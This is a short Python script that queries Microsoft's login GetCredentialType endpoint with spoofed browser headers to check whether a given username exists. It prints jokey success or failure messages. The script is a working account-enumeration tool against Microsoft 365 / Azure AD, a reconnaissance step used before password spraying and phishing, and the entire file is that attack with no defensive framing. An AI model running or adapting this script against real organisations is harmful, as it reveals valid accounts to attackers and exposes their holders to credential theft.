import requests
import argparse
import json

def send_post_request(username):
    url = "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US"
    headers = {
        "Host": "login.microsoftonline.com",
        "Sec-Ch-Ua": '"Chromium";v="123", "Not:A-Brand";v="8"',
        "Hpgrequestid": "cf6d24e9-109c-4ed1-a066-68920861ef00",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36",
        "Canary": "",
        "Content-Type": "application/json; charset=UTF-8",
        "Hpgid": "1104",
        "Accept": "application/json",
        "Hpgact": "1800",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Origin": "https://login.microsoftonline.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i",
        "Connection": "close",
    }
    payload = {
        "username": username,
        "isOtherIdpSupported": True,
        "checkPhones": False,
        "isRemoteNGCSupported": True,
        "isCookieBannerShown": False,
        "isFidoSupported": True,
        "originalRequest": "",
        "country": "US",
        "forceotclogin": False,
        "isExternalFederationDisallowed": False,
        "isRemoteConnectSupported": False,
        "federationFlags": 0,
        "isSignup": False,
        "flowToken": "",
        "isAccessPassSupported": True
    }
    
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    res = json.loads(response.text)
    if res['IfExistsResult'] == 0:
        print(f'[+] You done got the user! {username} is a real boy!')
    else:
        print(f"[-] sorry there buckaroo {username} ain't no one in particular")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send POST request with a username.')
    parser.add_argument('username', type=str, help='The username to be included in the request payload.')
    args = parser.parse_args()
    send_post_request(args.username)
